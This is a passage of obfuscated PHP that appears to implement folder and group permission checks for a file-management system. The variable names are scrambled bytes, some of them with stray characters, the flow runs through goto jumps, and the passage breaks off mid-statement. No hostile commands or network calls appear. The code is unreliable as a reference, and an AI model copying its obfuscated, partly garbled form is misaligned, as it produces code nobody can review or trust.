$this->sourceListAuth(array($f†³¯÷§—ğ)); } goto aöŠ‰ÔØÜÈ; e›ÁÎËƒ‡: $cª®”É”ğ = Model($cè’Åî¬êÄ[796])->field($FòßåøŒƒ)->where($b‡‚¢øæ)->select(); $F¢Øª©‘æ = array($f†³¯÷§—ğ); foreach ($cª®”É”ğ as $e…áêâ„á§) { foreach ($d‹¾šâÀ±  as $A½Ãù‡Å„) { $e®÷Øœä×Æ = $cè’Åî¬êÄ[47] . $A½Ãù‡Å„ . $cè’Åî¬êÄ[47]; $DÉœ½èôÆÙ = $e…áêâ„á§[$cè’Åî¬êÄ[481]] . $e…áêâ„á§[$cè’Åî¬êÄ[390]] . $cè’Åî¬êÄ[47]; if (strstr($DÉœ½èôÆÙ, $e®÷Øœä×Æ)) { $F¢Øª©‘æ[] = $e…áêâ„á§[$cè’Åî¬êÄ[390]]; break; } } } goto F Ş¬Õ§Ü‰; aöŠ‰ÔØÜÈ: if ($cğ¶ƒòÌù[$cè’Åî¬êÄ[398]] != SourceModel::TYPE_GROUP) { return array(); } $D§‰‚·Ş®„ = 1; $d‹¾šâÀ±  = array($f†³¯÷§—ğ); goto bãµ™¼¯Š; bãµ™¼¯Š: if ($cğ¶ƒòÌù[$cè’Åî¬êÄ[472]] == $cè’Åî¬êÄ[491] && $cğ¶ƒòÌù[$cè’Åî¬êÄ[478]] != $D§‰‚·Ş®„) { $d‹¾šâÀ±  = $this->groupChidldAllRootSource($cğ¶ƒòÌù[$cè’Åî¬êÄ[478]]); } $e†¤ƒ¸–… = $this->field($cè’Åî¬êÄ[390])->group($cè’Åî¬êÄ[390])->select(); $e†¤ƒ¸–… = array_to_keyvalue($e†¤ƒ¸–…, $cè’Åî¬êÄ[33], $cè’Åî¬êÄ[390]); goto D¯Ÿ½Ô•½ƒ; D¯Ÿ½Ô•½ƒ: if (!$e†¤ƒ¸–…) { return array(); } $FòßåøŒƒ = $cè’Åî¬êÄ[1866]; $b‡‚¢øæ = array($cè’Åî¬êÄ[390] => array($cè’Åî¬êÄ[7], $e†¤ƒ¸–…), $cè’Åî¬êÄ[417] => $cè’Åî¬êÄ[491]); goto e›ÁÎËƒ‡; B·éÉ©…ô¦: } private function sourceListAuth($f¨¿âˆŠ) { goto CØÅ”³«; C‹ÇàØíê‚: $eÖ‹íËÖ®È = array(); $c¨¡…Û¿‘£ = array(); foreach ($C¶¶İ˜Ó‰ as $C±‹¦¯™´è) { goto aØªÄ·Šë·; D† İ¤çâ¥: unset($C±‹¦¯™´è[$dÙ×Á…é·’[84]]); $fÍÃŠ‘·¸ = $B‡¯êßùˆ[$C±‹¦¯™´è[$dÙ×Á…é·’[390]]]; if (!$fÍÃŠ‘·¸) { continue; } goto F¡·½¥İŒ§; aØªÄ·Šë·: unset($C±‹¦¯™´è[$dÙ×Á…é·’[428]]); unset($C±‹¦¯™´è[$dÙ×Á…é·’[426]]); unset($C±‹¦¯™´è[$dÙ×Á…é·’[400]]); goto D† İ¤çâ¥; F¡·½¥İŒ§: $C±‹¦¯™´è[$dÙ×Á…é·’[1867]] = $this->authTargetInfo($fÍÃŠ‘·¸); $C±‹¦¯™´è[$dÙ×Á…é·’[489]] = rtrim($C±‹¦¯™´è[$dÙ×Á…é·’[484]], $dÙ×Á…é·’[8]) . $dÙ×Á…é·’[8] . ltrim($C±‹¦¯™´è[$dÙ×Á…é·’[489]], $dÙ×Á…é·’[8]); $eÖ‹íËÖ®È[] = $C±‹¦¯™´è; goto AÜ†ôŸÔë²; AÜ†ôŸÔë²: $CÈ›²œ‰Ö‰ = count(explode($dÙ×Á…é·’[8], trim($C±‹¦¯™´è[$dÙ×Á…é·’[489]], $dÙ×Á…é·’[8]))); $c¨¡…Û¿‘£[] = $CÈ›²œ‰Ö‰ + ($C±‹¦¯™´è[$dÙ×Á…é·’[29]] == $dÙ×Á…é·’[76] ? 0 : 1000); goto eæËæ©¢¨; eæËæ©¢¨: } goto C¯Åí°µ¨; C¯Åí°µ¨: array_multisort($c¨¡…Û¿‘£, SORT_ASC, $eÖ‹íËÖ®È); return $eÖ‹íËÖ®È; goto C‚êÏÉì×; CØÅ”³«: $dÙ×Á…é·’ =& $_SERVER[…ë˜õ]; $C¶¶İ˜Ó‰ = Model($dÙ×Á…é·’[1209])->sourceListInfo($f¨¿âˆŠ, !0); $B‡¯êßùˆ = $this->sourceAuthSelect($f¨¿âˆŠ); goto C‹ÇàØíê‚; C‚êÏÉì×: } private function groupChidldAllRootSource($dÜñëøëÂİ) { $BÄ˜³–ñËŠ =& $_SERVER[…ë˜õ]; $B’¦Ú¡«æ÷ = Model($BÄ˜³–ñËŠ[1868])->groupChildrenAll($dÜñëøëÂİ); $D¶²˜ÍäÕ‘ = array($BÄ˜³–ñËŠ[472] => 0, $BÄ˜³–ñËŠ[478] => array($BÄ˜³–ñËŠ[7], $B’¦Ú¡«æ÷), $BÄ˜³–ñËŠ[398] => SourceModel::TYPE_GROUP); $e’õˆãóæ¹ = Model($BÄ˜³–ñËŠ[796])->field($BÄ˜³–ñËŠ[390])->where($D¶²˜ÍäÕ‘)->select(); $e’õˆãóæ¹ = array_to_keyvalue($e’õˆãóæ¹, $BÄ˜³–ñËŠ[33], $BÄ˜³–ñËŠ[390]); return $e’õˆãóæ¹; } private function authTargetInfo($b³¿åØ‡Ä®) { goto eêì¡·ÓŸ; F–Û™¦š•: $aÇ¸Ÿè¹æÃ = 2 << 25; foreach ($b³¿åØ‡Ä® as $dª×£ŠÎğ…) { goto DŒà°¦–¤Ö; Bïğ‰ËíšÖ: if ($dª×£ŠÎğ…[$d¯³èÏ¸µÄ[398]] == SourceModel::TYPE_USER && $dª×£ŠÎğ…[$d¯³èÏ¸µÄ[478]] == $d¯³èÏ¸µÄ[491]) { $eöãÂäÕ = 0; } $d ÎÍø¤İ¢[] = $cĞá›„»Ë[$d¯³èÏ¸µÄ[400]] + $eöãÂäÕ; goto DöÈ»±êË; D¡à™î™ÁŞ: if (!$D™’ì×Ø) { continue; } $D™’ì×Ø[$d¯³èÏ¸µÄ[440]] = $cĞá›„»Ë; $C©¹ˆñ’œ[] = $D™’ì×Ø; goto Cóã‡Şİãä; DŒà°¦–¤Ö: $cĞá›„»Ë = Model($d¯³èÏ¸µÄ[1863])->listData($dª×£ŠÎğ…[$d¯³èÏ¸µÄ[1791]]); if (!$cĞá›„»Ë) { continue; } if ($dª×£ŠÎğ…[$d¯³èÏ¸µÄ[398]] == SourceModel::TYPE_USER) { $D™’ì×Ø = Model($d¯³èÏ¸µÄ[497])->getInfoSimpleOuter($dª×£ŠÎğ…[$d¯³èÏ¸µÄ[478]]); if ($D™’ì×Ø[$d¯³èÏ¸µÄ[1531]] == $d¯³èÏ¸µÄ[1090]) { continue; } if ($D™’ì×Ø[$d¯³èÏ¸µÄ[1531]] == $d¯³èÏ¸µÄ[491]) { $D™’ì×Ø[$d¯³èÏ¸µÄ[28]] = LNG($d¯³èÏ¸µÄ[1869]); } } else { $D™’ì×Ø = Model($d¯³èÏ¸µÄ[480])->getInfoSimple($dª×£ŠÎğ…[$d¯³èÏ¸µÄ[478]]); } goto D¡à™î™ÁŞ; Cóã‡Şİãä: $eöãÂäÕ = 0; if ($dª×£ŠÎğ…[$d¯³èÏ¸µÄ[398]] == SourceModel::TYPE_GROUP) { $eöãÂäÕ = $aÇ¸Ÿè¹æÃ * 2; } if ($dª×£ŠÎğ…[$d¯³èÏ¸µÄ[398]] == SourceModel::TYPE_USER) { $eöãÂäÕ = $aÇ¸Ÿè¹æÃ; } goto Bïğ‰ËíšÖ; DöÈ»±êË: } array_multisort($d ÎÍø¤İ¢, SORT_DESC, $C©¹ˆñ’œ); goto D‰Ìâª©º; D‰Ìâª©º: return $C©¹ˆñ’œ; goto a™í¢‡¶¨À; eêì¡·ÓŸ: $d¯³èÏ¸µÄ =& $_SERVER[…ë˜õ]; $C©¹ˆñ’œ = array(); $d ÎÍø¤İ¢ = array(); goto F–Û™¦š•; a™í¢‡¶¨À: } public function getAllChildrenByUser($F·¬ø­ì¸, $AçÊæÍˆäÃ) { goto a‡ÏÊ¹; dÎ›Ñìá¶Ç: $fÃ“ã–Âº = Model($dÂ¥ÍÜœó[1209])->sourceInfo($F·¬ø­ì¸); $d¿ƒ«†Ä·· = array(); $a¤œÊîš‰ = 1; goto aŠ¢ŒÂË; aŠ¢ŒÂË: if ($fÃ“ã–Âº[$dÂ¥ÍÜœó[472]] == $dÂ¥ÍÜœó[491] && $fÃ“ã–Âº[$dÂ¥ÍÜœó[478]] != $a¤œÊîš‰ && $this->groupContainUser($fÃ“ã–Âº[$dÂ¥ÍÜœó[478]], $AçÊæÍˆäÃ)) { foreach ($dŒ ÓÔ“‚Ë[$dÂ¥ÍÜœó[1870]] as $D”›Ò„Œ…È) { $e†¥áŒÕÛ = Model($dÂ¥ÍÜœó[480])->getInfo($D”›Ò„Œ…È[$dÂ¥ÍÜœó[1694]]); $D¼ÇÑù£ê‚ = Model($dÂ¥ÍÜœó[501])->getInfoSimpleOuter($AçÊæÍˆäÃ); $D¼ÇÑù£ê‚[$dÂ¥ÍÜœó[440]] = $D”›Ò„Œ…È[$dÂ¥ÍÜœó[400]]; if (Model($dÂ¥ÍÜœó[1863])->authCheckAction($D”›Ò„Œ…È[$dÂ¥ÍÜœó[400]][$dÂ¥ÍÜœó[400]], $dÂ¥ÍÜœó[1714])) { continue; } $AÔ¸–²© = array($dÂ¥ÍÜœó[28] => $dÂ¥ÍÜœó[1483] . $e†¥áŒÕÛ[$dÂ¥ÍÜœó[28]], $dÂ¥ÍÜœó[390] => $e†¥áŒÕÛ[$dÂ¥ÍÜœó[84]][$dÂ¥ÍÜœó[390]], $dÂ¥ÍÜœó[75] => KodIO::make($e†¥áŒÕÛ[$dÂ¥ÍÜœó[84]][$dÂ¥ÍÜœó[390]]), $dÂ¥ÍÜœó[472] => $dÂ¥ÍÜœó[491], $dÂ¥ÍÜœó[398] => $dÂ¥ÍÜœó[1021], $dÂ¥ÍÜœó[29] => $dÂ¥ÍÜœó[512], $dÂ¥ÍÜœó[489] => $e†¥áŒÕÛ[$dÂ¥ÍÜœó[485]], $dÂ¥ÍÜœó[1694] => $e†¥áŒÕÛ[$dÂ¥ÍÜœó[1694]], $dÂ¥ÍÜœó[482] => $e†¥áŒÕÛ[$dÂ¥ÍÜœó[472]], $dÂ¥ÍÜœó[1867] => array($D¼ÇÑù£ê‚)); $d¿ƒ«†Ä··[$AÔ¸–²©[$dÂ¥ÍÜœó[390]]] = $AÔ¸–²©; } } $b°›©§áÛ = array(); $cßßàÇÅ‚ = $this->getAllChildren($F·¬ø­ì¸); goto F¢­í¯‰ó; E‰Ì“ÀàŸš: return $b°›©§áÛ; goto EÂùâ­ò¨; a‡ÏÊ¹: $dÂ¥ÍÜœó =& $_SERVER[…ë˜õ]; $dŒ ÓÔ“‚Ë = Model($dÂ¥ÍÜœó[501])->getInfo($AçÊæÍˆäÃ); if (!$AçÊæÍˆäÃ || !$F·¬ø­ì¸ || !$dŒ ÓÔ“‚Ë) { return array(); } goto dÎ›Ñìá¶Ç; F¢­í¯‰ó: foreach ($cßßàÇÅ‚ as $bŸ™Â¶Âµ‰) { $eŞ¯“¤¹Ôº = !1; foreach ($bŸ™Â¶Âµ‰[$dÂ¥ÍÜœó[1867]] as $aÈƒ½Ÿæ) { if ($aÈƒ½Ÿæ[$dÂ¥ÍÜœó[1531]]) { if ($aÈƒ½Ÿæ[$dÂ¥ÍÜœó[1531]] == $AçÊæÍˆäÃ) { $eŞ¯“¤¹Ôº = !0; break; } } if ($aÈƒ½Ÿæ[$dÂ¥ÍÜœó[1694]]) { if ($this->groupContainUser($aÈƒ½Ÿæ[$dÂ¥ÍÜœó[1694]], $AçÊæÍˆäÃ)) { $eŞ¯“¤¹Ôº = !0; break; } } } if ($eŞ¯“¤¹Ôº) { $b°›©§áÛ[] = $bŸ™Â¶Âµ‰; } $Câ—ŒÂ—§Ò = $bŸ™Â¶Âµ‰[$dÂ¥ÍÜœó[390]]; if (isset($d¿ƒ«†Ä··[$Câ—ŒÂ—§Ò])) { $bŸ™Â¶Âµ‰[$dÂ¥ÍÜœó[1867]][] = $d¿ƒ«†Ä··[$Câ—ŒÂ—§Ò][0]; $d¿ƒ«†Ä··[$Câ—ŒÂ—§Ò] = !1; } } $d¿ƒ«†Ä·· = array_filter(array_values($d¿ƒ«†Ä··)); $b°›©§áÛ = array_merge($d¿ƒ«†Ä··, $b°›©§áÛ); goto E‰Ì“ÀàŸš; EÂùâ­ò¨: } public function setAllChildrenByUser($AÄº †Ëå…, $d¤¦‰ÂçŸÃ, $F®˜½á‚ó) { $bĞ–©œÚ±› =& $_SERVER[…ë˜õ]; $DÌ¶ç½éäæ = $this->getAllChildrenByUser($AÄº †Ëå…, $d¤¦‰ÂçŸÃ); if (!$F®˜½á‚ó || !$DÌ¶ç½éäæ) { return !1; } foreach ($DÌ¶ç½éäæ as $aŸôôË•ç±) { $e¢Ë¸çóì› = array(); foreach ($aŸôôË•ç±[$bĞ–©œÚ±›[1867]] as $B¦‰éÂ¡Áš) { $DÙ—¢¹¹Ç„ = $B¦‰éÂ¡Áš[$bĞ–©œÚ±›[440]]; $F˜îö‡ŠŸ˜ = $B¦‰éÂ¡Áš[$bĞ–©œÚ±›[1531]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $D¯–øùŒƒ‡ = $B¦‰éÂ¡Áš[$bĞ–©œÚ±›[1531]] ? $B¦‰éÂ¡Áš[$bĞ–©œÚ±›[1531]] : $B¦‰éÂ¡Áš[$bĞ–©œÚ±›[1694]]; if ($B¦‰éÂ¡Áš[$bĞ–©œÚ±›[1531]] && $B¦‰éÂ¡Áš[$bĞ–©œÚ±›[1531]] == $d¤¦‰ÂçŸÃ) { continue; } $e¢Ë¸çóì›[] = array($bĞ–©œÚ±›[390] => $aŸôôË•ç±[$bĞ–©œÚ±›[390]], $bĞ–©œÚ±›[398] => $F˜îö‡ŠŸ˜, $bĞ–©œÚ±›[478] => intval($D¯–øùŒƒ‡), $bĞ–©œÚ±›[1791] => isset($DÙ—¢¹¹Ç„[$bĞ–©œÚ±›[388]]) ? intval($DÙ—¢¹¹Ç„[$bĞ–©œÚ±›[388]]) : 0, $bĞ–©œÚ±›[1845] => isset($DÙ—¢¹¹Ç„[$bĞ–©œÚ±›[1845]]) ? intval($DÙ—¢¹¹Ç„[$bĞ–©œÚ±›[1845]]) : -1); } $e¢Ë¸çóì›[] = array($bĞ–©œÚ±›[390] => $aŸôôË•ç±[$bĞ–©œÚ±›[390]], $bĞ–©œÚ±›[398] => SourceModel::TYPE_USER, $bĞ–©œÚ±›[478] => intval($d¤¦‰ÂçŸÃ), $bĞ–©œÚ±›[1791] => intval($F®˜½á‚ó), $bĞ–©œÚ±›[1845] => -1); $this->where(array($bĞ–©œÚ±›[404] => $aŸôôË•ç±[$bĞ–©œÚ±›[390]]))->delete(); $this->addAll($e¢Ë¸çóì›); } return !0; } public function get($f¼íòÆÊ„) { $a˜¨“ô°ï = $this->getSourceList(array($f¼íòÆÊ„), !0); return $a˜¨“ô°ï[0]; } public function getSourceList($Aï«­ºÙÚ¾, $C×Ò±‡Ç·Ì = false, $C…°ô·›Ø = false) { goto eåÆÍ÷›Š; eåÆÍ÷›Š: $cÙœßçÄ¨¾ =& $_SERVER[…ë˜õ]; if (!$Aï«­ºÙÚ¾) { return array(); } $eƒéŞİÊ‰ê = Model($cÙœßçÄ¨¾[1209]); goto A’…ÁŠ¿ŒÆ; d¼×é¤¦‘­: foreach ($C×Ò±‡Ç·Ì as $C¿Ôšïáó => $dõ¢è¬‹ãº) { $CôŸæÄ–‰° = $eƒéŞİÊ‰ê->parentLevelArray($dõ¢è¬‹ãº[$cÙœßçÄ¨¾[481]]); $F“«ëÏØÇ = array_merge($F“«ëÏØÇ, array($C¿Ôšïáó), array_reverse($CôŸæÄ–‰°)); } $F“«ëÏØÇ = array_values(array_unique($F“«ëÏØÇ)); if (!$F“«ëÏØÇ) { return array(); } goto Bñ–Å­Òªó; A’…ÁŠ¿ŒÆ: if (!$C×Ò±‡Ç·Ì && count($Aï«­ºÙÚ¾) == 1) { $C×Ò±‡Ç·Ì = array(); $C×Ò±‡Ç·Ì[$Aï«­ºÙÚ¾[0]] = $eƒéŞİÊ‰ê->sourceInfo($Aï«­ºÙÚ¾[0]); } if (!$C×Ò±‡Ç·Ì) { $EÊ‘­ëçÊ‹ = array($cÙœßçÄ¨¾[404] => array($cÙœßçÄ¨¾[405], $Aï«­ºÙÚ¾)); $C×Ò±‡Ç·Ì = $eƒéŞİÊ‰ê->field($cÙœßçÄ¨¾[1871])->where($EÊ‘­ëçÊ‹)->select(); $C×Ò±‡Ç·Ì = array_to_keyvalue($C×Ò±‡Ç·Ì, $cÙœßçÄ¨¾[390]); } $F“«ëÏØÇ = $Aï«­ºÙÚ¾; goto d¼×é¤¦‘­; Bñ–Å­Òªó: $C¼”õ·›³ö = $this->sourceAuthSelect($F“«ëÏØÇ); $F·Õó½ƒ¸Î = array(); foreach ($F“«ëÏØÇ as $D¥†å…¶œ‹) { if (isset($C¼”õ·›³ö[$D¥†å…¶œ‹])) { $F·Õó½ƒ¸Î[$D¥†å…¶œ‹] = $C¼”õ·›³ö[$D¥†å…¶œ‹]; } } goto eÈÏêéŞäö; c¬ˆ­åø¢¸: $a¤Ú¿Ïñ›´ = array(); foreach ($C×Ò±‡Ç·Ì as $D¥†å…¶œ‹ => $C×çä£„Èç) { if ($Dì¦±±×½„) { $a¤Ú¿Ïñ›´[$D¥†å…¶œ‹] = $CŞ•ó”¿; continue; } $a¤Ú¿Ïñ›´[$D¥†å…¶œ‹] = $this->makeSourceAuth($C×çä£„Èç, $F·Õó½ƒ¸Î, $C…°ô·›Ø); } return $a¤Ú¿Ïñ›´; goto FÇ˜óœ•¿Œ; eÈÏêéŞäö: $Dì¦±±×½„ = $this->userIsRoot($C…°ô·›Ø); $bŒ‡íöÛè = AuthModel::authAll(); $CŞ•ó”¿ = array($cÙœßçÄ¨¾[401] => $bŒ‡íöÛè, $cÙœßçÄ¨¾[1872] => array($cÙœßçÄ¨¾[406] => 0, $cÙœßçÄ¨¾[1700] => $bŒ‡íöÛè, $cÙœßçÄ¨¾[407] => LNG($cÙœßçÄ¨¾[1873]), $cÙœßçÄ¨¾[1715] => $cÙœßçÄ¨¾[1874])); goto c¬ˆ­åø¢¸; FÇ˜óœ•¿Œ: } public function authDeepCheck($Béºâ³ò¯¾, $D§‹¹æïó = false) { goto E²ÛçÔŸí­; E²ÛçÔŸí­: $cíÌëˆŞ† =& $_SERVER[…ë˜õ]; $D§‹¹æïó = $D§‹¹æïó ? $D§‹¹æïó : USER_ID; $C£•ÜÅ°‚ = $this->makeAuthDeep($D§‹¹æïó); goto fÃÃËå˜Áñ; fÃÃËå˜Áñ: if (!in_array($Béºâ³ò¯¾, $C£•ÜÅ°‚[$cíÌëˆŞ†[1875]])) { return !1; } $BÑù†Á¢‘ß = array(); foreach ($C£•ÜÅ°‚[$cíÌëˆŞ†[1876]] as $C­‰ƒ“İ—Ô => $E¹–¦ñÑÏÌ) { if (!in_array($Béºâ³ò¯¾, $E¹–¦ñÑÏÌ)) { continue; } $BÑù†Á¢‘ß[] = $C­‰ƒ“İ—Ô; } goto FŞ¬Å¡¹İ’; FŞ¬Å¡¹İ’: if (!$BÑù†Á¢‘ß) { return !1; } $bÂÛÑÃË = $BÑù†Á¢‘ß ? $BÑù†Á¢‘ß[0] : $Béºâ³ò¯¾; return array($cíÌëˆŞ†[401] => -1, $cíÌëˆŞ†[440] => array($cíÌëˆŞ†[406] => $cíÌëˆŞ†[1090], $cíÌëˆŞ†[1700] => $cíÌëˆŞ†[491], $cíÌëˆŞ†[407] => LNG($cíÌëˆŞ†[1877]), $cíÌëˆŞ†[1715] => $cíÌëˆŞ†[1878]), $cíÌëˆŞ†[1879] => LNG($cíÌëˆŞ†[1880]), $cíÌëˆŞ†[1881] => $this->sourceAuthInfo($bÂÛÑÃË)); goto AÜÔ°¶îº°; AÜÔ°¶îº°: } protected function makeAuthDeep($Aêª¯š…î = false) { goto Dğ¶µÌì¼ì; e°°Ìô¹„: $f±˜»¨·öÊ = $aöãŸİÊ; $D’øä…ƒò = Model($cŸ¿ª‡…‡Ä[1209]); $f…¹½„šñ— = Model($cŸ¿ª‡…‡Ä[480]); goto a’†í›Ãİ; D¯„ÇœìŞ: $Fëá—Ğ®ã¤ = array_to_keyvalue_group($e“¾§Ïˆâ, $cŸ¿ª‡…‡Ä[390]); foreach ($Fëá—Ğ®ã¤ as $e‚‡ßŒŸâ¬ => $dÉ³íÎ•ÙÜ) { $c‹ßëÇ„Ë = $this->authArrayCheck($dÉ³íÎ•ÙÜ, $Aêª¯š…î); if ($c‹ßëÇ„Ë[$cŸ¿ª‡…‡Ä[401]] > 0) { $E¶ÑÑ£ã¹‹[] = $e‚‡ßŒŸâ¬ . $cŸ¿ª‡…‡Ä[33]; } } $D±àÑ‰ÜèÜ = array(); goto e°°Ìô¹„; A¡Úç…óñ£: $E…İÛ†Áª = array(); if ($E¶ÑÑ£ã¹‹) { $c–—Îã¡¹ò = $D’øä…ƒò->where(array($cŸ¿ª‡…‡Ä[390] => array($cŸ¿ª‡…‡Ä[405], $E¶ÑÑ£ã¹‹)))->select(); foreach ($c–—Îã¡¹ò as $CÜó·„î©’) { $Dã¨äÌ‰ÔØ = $D’øä…ƒò->parentLevelArray($CÜó·„î©’[$cŸ¿ª‡…‡Ä[481]]); $D±àÑ‰ÜèÜ = array_merge($D±àÑ‰ÜèÜ, $Dã¨äÌ‰ÔØ); $f±˜»¨·öÊ[] = $CÜó·„î©’[$cŸ¿ª‡…‡Ä[478]]; $E¹‡«¾´ğ‰[$CÜó·„î©’[$cŸ¿ª‡…‡Ä[390]]] = $Dã¨äÌ‰ÔØ; $AŒĞâ‰Ÿ»[$CÜó·„î©’[$cŸ¿ª‡…‡Ä[390]]] = $CÜó·„î©’[$cŸ¿ª‡…‡Ä[478]]; } } $f±˜»¨·öÊ = array_values(array_unique($f±˜»¨·öÊ)); goto d¸æª‰×¨“; d¸æª‰×¨“: $BŠ«„æî²ï = $f±˜»¨·öÊ; foreach ($BŠ«„æî²ï as $A÷ØíŞº¤ò) { $C˜ßØõà² = $f…¹½„šñ—->getInfo($A÷ØíŞº¤ò); $Dã¨äÌ‰ÔØ = $D’øä…ƒò->parentLevelArray($C˜ßØõà²[$cŸ¿ª‡…‡Ä[481]]); $f±˜»¨·öÊ = array_merge($f±˜»¨·öÊ, $Dã¨äÌ‰ÔØ); } $f±˜»¨·öÊ = array_values(array_unique($f±˜»¨·öÊ)); goto B‚í¸ŞØ™; a’†í›Ãİ: $E¹‡«¾´ğ‰ = array(); $AŒĞâ‰Ÿ» = array(); $Bğ•¥ ¤‚³ = array(); goto A¡Úç…óñ£; Dğ¶µÌì¼ì: $cŸ¿ª‡…‡Ä =& $_SERVER[…ë˜õ]; static $c‹Á²£»íÆ = array(); $Aêª¯š…î = $Aêª¯š…î ? $Aêª¯š…î : USER_ID; goto AÁí’«äµ; AÁí’«äµ: if (isset($c‹Á²£»íÆ[$Aêª¯š…î])) { return $c‹Á²£»íÆ[$Aêª¯š…î]; } $D­Ÿ‚–ãŠ = Model($cŸ¿ª‡…‡Ä[1882])->listData(); $aØÜ»¦Ñµ‡ = array(); goto a¾äÊ¶¨¶; A”‡æ‘–â: if ($aöãŸİÊ) { $AÁµà‡æõ = array(array($cŸ¿ª‡…‡Ä[398] => SourceModel::TYPE_USER, $cŸ¿ª‡…‡Ä[478] => $Aêª¯š…î), array($cŸ¿ª‡…‡Ä[398] => SourceModel::TYPE_GROUP, $cŸ¿ª‡…‡Ä[478] => array($cŸ¿ª‡…‡Ä[405], $aöãŸİÊ)), $cŸ¿ª‡…‡Ä[963] => $cŸ¿ª‡…‡Ä[1783]); } $e“¾§Ïˆâ = $this->field($cŸ¿ª‡…‡Ä[1883])->where($AÁµà‡æõ)->select(); $E¶ÑÑ£ã¹‹ = array(); goto D¯„ÇœìŞ; a¾äÊ¶¨¶: foreach ($D­Ÿ‚–ãŠ as $F£µİÏİŞ) { if ($F£µİÏİŞ[$cŸ¿ª‡…‡Ä[400]] == 0 && $F£µİÏİŞ[$cŸ¿ª‡…‡Ä[1716]] == $cŸ¿ª‡…‡Ä[86]) { $aØÜ»¦Ñµ‡[] = $F£µİÏİŞ[$cŸ¿ª‡…‡Ä[388]]; } } $aöãŸİÊ = $this->userGroupParents($Aêª¯š…î); $AÁµà‡æõ = array($cŸ¿ª‡…‡Ä[398] => SourceModel::TYPE_USER, $cŸ¿ª‡…‡Ä[478] => $Aêª¯š…î); goto A”‡æ‘–â; B‚í¸ŞØ™: foreach ($f±˜»¨·öÊ as $A÷ØíŞº¤ò) { $C˜ßØõà² = $f…¹½„šñ—->getInfo($A÷ØíŞº¤ò); $D±àÑ‰ÜèÜ[] = $C˜ßØõà²[$cŸ¿ª‡…‡Ä[84]][$cŸ¿ª‡…‡Ä[390]]; $Bğ•¥ ¤‚³[$A÷ØíŞº¤ò] = $C˜ßØõà²[$cŸ¿ª‡…‡Ä[84]][$cŸ¿ª‡…‡Ä[390]]; $E…İÛ†Áª[$A÷ØíŞº¤ò] = $D’øä…ƒò->parentLevelArray($C˜ßØõà²[$cŸ¿ª‡…‡Ä[481]]); } foreach ($E¹‡«¾´ğ‰ as $B†ÄáÅ•‡‰ => $CĞ¤–³‘âï) { $A¼´Ûê¢µê = $AŒĞâ‰Ÿ»[$B†ÄáÅ•‡‰]; if (!$A¼´Ûê¢µê || !$Bğ•¥ ¤‚³[$A¼´Ûê¢µê]) { continue; } $e¹¶Ù‰´ÁŒ = array(); foreach ($E…İÛ†Áª[$A¼´Ûê¢µê] as $A÷ØíŞº¤ò) { $e¹¶Ù‰´ÁŒ[] = $Bğ•¥ ¤‚³[$A÷ØíŞº¤ò]; } $E¹‡«¾´ğ‰[$B†ÄáÅ•‡‰] = array_merge($e¹¶Ù‰´ÁŒ, $CĞ¤–³‘âï); } $D±àÑ‰ÜèÜ = array_values(array_unique($D±àÑ‰ÜèÜ)); goto fĞš ³ Ä; fĞš ³ Ä: $f„áµÑî²³ = array($cŸ¿ª‡…‡Ä[1875] => $D±àÑ‰ÜèÜ, $cŸ¿ª‡…‡Ä[1876] => $E¹‡«¾´ğ‰); $c‹Á²£»íÆ[$Aêª¯š…î] = $f„áµÑî²³; return $f„áµÑî²³; goto E¸–Õ²¨¢; E¸–Õ²¨¢: } private function makeSourceAuth($aÒĞ‡¥Ô§«, $C˜òÍ°°², $aÈ®Ú½šÄˆ = false) { goto D¢‰Š£ªÀ¯; eÈ¸Š¢ğç: $bƒŞğ‘ßö£ = Model($aƒ¨¸Äö÷«[1209])->parentLevelArray($aÒĞ‡¥Ô§«[$aƒ¨¸Äö÷«[481]]); $bƒŞğ‘ßö£ = array_merge(array($aÒĞ‡¥Ô§«[$aƒ¨¸Äö÷«[390]]), array_reverse($bƒŞğ‘ßö£)); $BãŸÑ ìæõ = !1; goto Aº£ï§î³Î; B¢‚¹âäæœ: if (!$BãŸÑ ìæõ) { $e‰ºêëÇ¦ = Model($aƒ¨¸Äö÷«[480])->getInfo($DÄ·èø‹Ò¿); $cÉ²æ÷„‚å = explode($aƒ¨¸Äö÷«[47], trim($e‰ºêëÇ¦[$aƒ¨¸Äö÷«[481]], $aƒ¨¸Äö÷«[47])); $cÉ²æ÷„‚å = array_reverse($cÉ²æ÷„‚å); foreach ($cÉ²æ÷„‚å as $a§Àâõ½­) { if ($a§Àâõ½­ == $aƒ¨¸Äö÷«[491] || $a§Àâõ½­ == $e„ŒÛ»øÖ) { continue; } $E¾ô›ÍÕÕØ = $this->groupRootAuth($a§Àâõ½­, $aÈ®Ú½šÄˆ); if (!$E¾ô›ÍÕÕØ) { continue; } $BãŸÑ ìæõ = $this->groupAuthInfo($E¾ô›ÍÕÕØ, $a§Àâõ½­); break; } } if (!$BãŸÑ ìæõ || $BãŸÑ ìæõ[$aƒ¨¸Äö÷«[401]] <= 0) { $EÎë˜¦¡÷é = $this->authDeepCheck($aÒĞ‡¥Ô§«[$aƒ¨¸Äö÷«[390]], $aÈ®Ú½šÄˆ); if ($EÎë˜¦¡÷é) { $BãŸÑ ìæõ = $EÎë˜¦¡÷é; } } return $BãŸÑ ìæõ; goto EêÄÙÙÄé; DÉ¯›¾ïñÛ: $dªÙ»ô³¦ = $aÒĞ‡¥Ô§«[$aƒ¨¸Äö÷«[398]] == SourceModel::TYPE_GROUP; $c¾Ï¹Šè’ñ = $dªÙ»ô³¦ ? $this->groupRootAuth($DÄ·èø‹Ò¿, $aÈ®Ú½šÄˆ) : !1; if ($c¾Ï¹Šè’ñ && Model($aƒ¨¸Äö÷«[1863])->authCheckAction($c¾Ï¹Šè’ñ[$aƒ¨¸Äö÷«[400]], $aƒ¨¸Äö÷«[1714])) { return $this->groupAuthInfo($c¾Ï¹Šè’ñ, $DÄ·èø‹Ò¿); } goto eÈ¸Š¢ğç; Aº£ï§î³Î: foreach ($bƒŞğ‘ßö£ as $f³²†‹¤Î¶) { if (!isset($C˜òÍ°°²[$f³²†‹¤Î¶])) { continue; } $a×éƒËÍ©ø = $this->authMake($C˜òÍ°°²[$f³²†‹¤Î¶], $aÈ®Ú½šÄˆ); if ($a×éƒËÍ©ø[$aƒ¨¸Äö÷«[440]]) { $BãŸÑ ìæõ = $a×éƒËÍ©ø; break; } } if (!$dªÙ»ô³¦) { return $BãŸÑ ìæõ; } if (!$BãŸÑ ìæõ && $c¾Ï¹Šè’ñ) { $BãŸÑ ìæõ = $this->groupAuthInfo($c¾Ï¹Šè’ñ, $DÄ·èø‹Ò¿); } goto 